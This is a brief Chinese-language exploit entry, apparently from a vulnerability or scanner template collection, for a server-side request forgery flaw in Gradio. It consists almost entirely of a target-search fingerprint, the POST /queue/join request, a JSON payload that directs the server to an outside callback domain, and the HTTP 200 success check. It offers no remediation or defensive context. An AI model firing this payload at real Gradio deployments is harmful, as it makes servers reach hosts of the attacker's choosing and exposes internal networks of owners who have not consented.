# gradiogradio存在SSRF漏洞

gradiogradio ｜ SSRF ｜ —
- **指纹**：`title="gradio"`
- **请求**：`POST /queue/join? HTTP/1.1`

**Payload**
```
{"data":[{"path":"http://333.nxwpzootjn.iyhc.eu.org"}],"fn_index":0,"session_hash":"123"}
```
- **响应特征**：200